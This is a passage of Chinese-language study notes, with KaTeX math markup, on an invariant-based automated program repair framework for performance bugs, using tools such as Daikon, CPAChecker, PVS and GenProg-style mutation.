class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">se</span><span class="mclose">}</span></span></span></span></eq> , 工具的响应取决于正在检查的程序是否满足或违反了规范</p></li><li><p>为了提高对生成补丁有效性的信心，我们选择针对 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>c</mi><mi>o</mi><mi>r</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{correct}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">correc</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 和 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>v</mi><mi>i</mi><mi>o</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{violated}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 进行验证。 然而，为了降低调用验证器 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></eq> 的成本，我们打算实施一个三步的补丁验证方法，首先使用测试套件，然后在使用程序验证器，生成合理的补丁是通过使用测试用例在第一步完成的，第二步设计对合理补丁针对不良模式集合（属性 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>v</mi><mi>i</mi><mi>o</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{violated}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> ）进行检查，通过前两步的补丁在第三步针对良好模式集合（属性 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>c</mi><mi>o</mi><mi>r</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{correct}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">correc</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> ）进行检查</p></li></ul><h3 id="3-%E4%BD%BF%E7%94%A8invariant%E7%9A%84apr%E4%BF%AE%E5%A4%8D-performance-bugs" tabindex="-1">3 使用invariant的APR修复 Performance Bugs</h3><ul><li>性能bug是导致系统性能显著下降的编程错误。经验表明，许多广泛使用的商业软件都存在性能问题[13,6,10].</li><li>因此，这里需要开发一个严格的性能错误修复框架，确保在不影响功能的情况下提高效率。<ul><li>与功能错误相比，性能错误的一个独特特征是性能错误不会影响程序的功能性（即程序在语义上是正确的，但效率低下），因此可以使用不变量推断工具自动推断程序的与其行为</li></ul></li><li>本节描述了一个针对性能错误的基于不变量的APR系统，并演示了如何通过生成可以确保提高效率而不牺牲功能性的补丁来处理性能错误</li></ul><h4 id="3.1-%E9%92%88%E5%AF%B9%E6%80%A7%E8%83%BDbug%E7%9A%84%E5%9F%BA%E4%BA%8E%E4%B8%8D%E5%8F%98%E9%87%8F%E7%9A%84%E4%BF%AE%E5%A4%8D%E6%A1%86%E6%9E%B6" tabindex="-1">3.1 针对性能bug的基于不变量的修复框架</h4><ul><li><p>在本节，我们描述解决性能bug的基于不变量的修复框架，框架主要包含以下部分</p><ul><li><ol><li>通过测试集：包含使程序运行快速的测试用例。</li></ol></li><li><ol start="2"><li>失败测试集：包含导致程序运行缓慢的测试用例。</li></ol></li><li><ol start="3"><li>运行时监视器：用于跟踪程序的执行时间，并区分快速运行和缓慢运行。</li></ol></li><li><ol start="4"><li>自动不变量推断工具（例如Daikon或CPAChecker）和自动不变量验证工具（例如PVS、Z3求解器或CPAChecker）。</li></ol></li></ul></li><li><p>接下来讨论如何定义通过测试和失败测试的概念，以及针对性能错误，生成和验证补丁的过程</p></li></ul><h5 id="%E9%92%88%E5%AF%B9%E6%80%A7%E8%83%BD%E9%94%99%E8%AF%AF%E7%9A%84%E9%80%9A%E8%BF%87%E5%92%8C%E5%A4%B1%E8%B4%A5%E6%B5%8B%E8%AF%95" tabindex="-1">针对性能错误的通过和失败测试</h5><ul><li>性能错误在运行时不会产生debug信息：不会产生崩溃，异常或不正确的结果。 因此我们使用一个含有预定义定时器的运行时监视器来重新定义通过和失败测试的概念</li><li>我们将导致快速运行的测试用例视为通过测试，而导致缓慢运行的测试用例视为失败测试。</li><li>一个修复方案，可以将缓慢运行转换为快速运行，同时保持原程序的期望行为，有效的修复</li></ul><h5 id="%E9%92%88%E5%AF%B9%E6%80%A7%E8%83%BD%E9%94%99%E8%AF%AF%E7%9A%84%E8%A1%A5%E4%B8%81%E7%94%9F%E6%88%90%E7%AD%96%E7%95%A5" tabindex="-1">针对性能错误的补丁生成策略</h5><ul><li>因为我们处理的是语义上正确但效率底下的程序，因此通常可以通过重构原始程序的基本组件来创建程序的高效版本。</li><li>我们的初步分析表明，遗传修复工具（如GenProg）在处理性能错误方面是有效的。这表明，通过相对简单的更改，可以修复具有性能错误的程序。例如，可以使用遗传修复工具使用的移动，交换，删除和插入等变异操作符来修复各种性能错误</li><li>因此，我们的目标是将我们的修复框架和基于遗传的补丁生成工具结合起来</li></ul><h5 id="%E9%92%88%E5%AF%B9%E6%80%A7%E8%83%BD%E9%94%99%E8%AF%AF%E7%9A%84%E8%A1%A5%E4%B8%81%E9%AA%8C%E8%AF%81" tabindex="-1">针对性能错误的补丁验证</h5><ul><li>需要注意的是，不变量推断工具也可以用于推导与程序非功能属性相关的。这可以通过向被修复的程序添加额外的非功能变量来实现。</li><li>假设我们有一个程序 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 带有一组变量 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></eq> ，其中包含一个性能错误。 我们需要检查为程序 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 生成的补丁是否修理了性能错误，同时没有引入新的功能错误。为此，我们需要生成并验证与程序效率属性相关的断言，如下所述<ul><li><ol><li>添加一个新变量值 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>f</mi><mi>v</mi></mrow><annotation encoding="application/x-tex">nfv</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></eq> , 其值不会影响 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 的行为。正在处理的性能错误的类型决定了如何使用 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>f</mi><mi>v</mi></mrow><annotation encoding="application/x-tex">nfv</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></eq> 来模拟程序的效率。然而，对于我们考虑的循环程序，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>f</mi><mi>v</mi></mrow><annotation encoding="application/x-tex">nfv</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></eq> 的作用像一个计数器，每次迭代增加一次，换句话说，这是循环迭代次数作为效率的模型</li></ol></li><li><ol start="2"><li>使用不变量推断工具 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi></mrow><annotation encoding="application/x-tex">D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span></eq> 来推断原始版本和补丁版本的不变量上的数量，分别表示为 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">I</mi><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>n</mi><mi>f</mi><mi>v</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi mathvariant="script">I</mi><mo stretchy="false">(</mo><mi>p</mi><mi>t</mi><mo separator="true">,</mo><mi>n</mi><mi>f</mi><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{I}(P,nfv),\mathcal{I}(pt,nfv)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mopen">(</span><span class="mord mathnormal">pt</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span></eq>,前者表示 涉及变量 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>f</mi><mi>v</mi></mrow><annotation encoding="application/x-tex">nfv</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></eq> 的程序 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 的不变量集合</li></ol></li><li><ol start="3"><li>比较 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">I</mi><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>n</mi><mi>f</mi><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{I}(P,nfv)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span></eq> 和 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">I</mi><mo stretchy="false">(</mo><mi>p</mi><mi>t</mi><mo separator="true">,</mo><mi>n</mi><mi>f</mi><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{I}(pt,nfv)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mopen">(</span><span class="mord mathnormal">pt</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span></eq> 中的 数值 断言，确定补丁版本是否比原始版本更有效率</li></ol></li></ul></li><li>为简单起见，我们假设我们处理的程序只有一个循环。然而，分析程序中的循环数量决定了需要多少个额外变量，因此，不变量推断工具 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi></mrow><annotation encoding="application/x-tex">D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span></eq> 用于推断关于 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>∪</mo><mo stretchy="false">{</mo><mi>n</mi><mi>f</mi><mi>v</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">V\cup \{nfv\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">}</span></span></span></span></eq> 的不变量，然后我们区分以下类型的断言<ul><li><ol><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">I</mi><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>V</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{I}(P,V)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mclose">)</span></span></span></span></eq>： 与程序功能相关的断言</li></ol></li><li><ol start="2"><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">I</mi><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>n</mi><mi>f</mi><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{I}(P,nfv)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span></eq>：与程序效率相关的断言</li></ol></li></ul></li><li>使用生成的断言，可以用以下方法检测补丁的有效性 <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>v</mi><mi>a</mi><mi>l</mi><mi>i</mi><mi>d</mi><mi>i</mi><mi>t</mi><mi>y</mi><mo stretchy="false">(</mo><mi>p</mi><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><mi>S</mi><mi>E</mi><mi>M</mi><mi>A</mi><mi>E</mi><mi>Q</mi><mo stretchy="false">(</mo><mi mathvariant="script">I</mi><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>V</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo separator="true">,</mo><mi mathvariant="script">I</mi><mo stretchy="false">(</mo><mi>p</mi><mi>t</mi><mo separator="true">,</mo><mi>V</mi><mo stretchy="false">)</mo><mo>∧</mo><mi>P</mi><mi>R</mi><mi>E</mi><mi>D</mi><mi>S</mi><mi>M</mi><mo stretchy="false">(</mo><mi mathvariant="script">I</mi><mo stretchy="false">(</mo><mi>p</mi><mi>t</mi><mo separator="true">,</mo><mi>n</mi><mi>f</mi><mi>v</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi mathvariant="script">I</mi><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>n</mi><mi>f</mi><mi>v</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">validity(pt)=SEMAEQ(\mathcal{I}(P,V)),\mathcal{I}(pt,V) \wedge PREDSM(\mathcal{I}(pt,nfv),\mathcal{I}(P,nfv))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mopen">(</span><span class="mord mathnormal">pt</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">SEM</span><span class="mord mathnormal">A</span><span class="mord mathnormal">EQ</span><span class="mopen">(</span><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mclose">))</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mopen">(</span><span class="mord mathnormal">pt</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">PRE</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.10903em;">SM</span><span class="mopen">(</span><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mopen">(</span><span class="mord mathnormal">pt</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">))</span></span></span></span></span></eqn></section> 其中 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>E</mi><mi>M</mi><mi>A</mi><mi>E</mi><mi>Q</mi></mrow><annotation encoding="application/x-tex">SEMAEQ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">SEM</span><span class="mord mathnormal">A</span><span class="mord mathnormal">EQ</span></span></span></span></eq> 是一个bool操作来检查给定的不变量集合是否语义相同，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>R</mi><mi>E</mi><mi>D</mi><mi>S</mi><mi>M</mi></mrow><annotation encoding="application/x-tex">PREDSM</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">PRE</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.10903em;">SM</span></span></span></span></eq> 是一个bool操作来检查与修补版本相关的谓词中的上界是否小于与原始程序相关的谓词中的上界。</li><li>我们现在描述两种正式的程序，使用可用的程序验证工具验证合理补丁的有效性<ul><li><ol><li>Daikon-PVS：在这个补丁验证过程中，Daikon用于生成和程序 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo separator="true">,</mo><mi>p</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">P,pt</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">pt</span></span></span></span></eq> 功能和效率相关的断言。 如果 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">I</mi><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>V</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi mathvariant="script">I</mi><mo stretchy="false">(</mo><mi>p</mi><mi>t</mi><mo separator="true">,</mo><mi>V</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{I}(P,V),\mathcal{I}(pt,V)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mopen">(</span><span class="mord mathnormal">pt</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mclose">)</span></span></span></span></eq> (即与功能属性相关的断言)不相同，则可能需要检查这些集合中的谓词之间的等价和蕴含关系，以确定 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 和 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">pt</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8095em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">pt</span></span></span></span></eq> 是否在语义上等价。通过查询定理证明器 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>V</mi><mi>S</mi></mrow><annotation encoding="application/x-tex">PVS</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq> ，可以完成这项任务。</li></ol></li><li><ol start="2"><li>CPAChecker-PVS:CPACheck的一个有趣特性是它以GraphML格式产生正确性证明，并且在这些证明中，可以分析程序的不变量。可以利用这个特性生成原始程序和相应的合理程序的不变量集合。如果两个程序的不变量集合不相同，则可能需要调用 PVS来检查这两个不变量集合之间的等价和蕴含关系。</li></ol></li></ul></li></ul><h4 